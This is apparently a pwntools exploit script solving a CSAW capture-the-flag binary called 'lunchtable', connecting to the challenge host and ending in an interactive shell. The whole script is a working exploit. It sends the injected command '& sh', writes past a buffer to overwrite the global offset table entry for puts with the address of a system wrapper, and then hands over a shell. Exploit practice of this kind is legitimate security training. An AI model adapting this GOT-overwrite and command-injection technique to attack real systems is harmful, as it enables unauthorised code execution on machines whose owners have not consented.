from pwn import *

e = ELF("./lunchtable")

#p = process(e.path)
p = remote("pwn.chal.csaw.io", 1001)

p.sendline("& sh")
p.sendline()
p.sendline("y")
p.sendline(str(e.got["puts"] - e.symbols["buffer"]))
p.sendline(p64(e.symbols["system_wrapper"]))
p.sendline("n")

p.interactive()
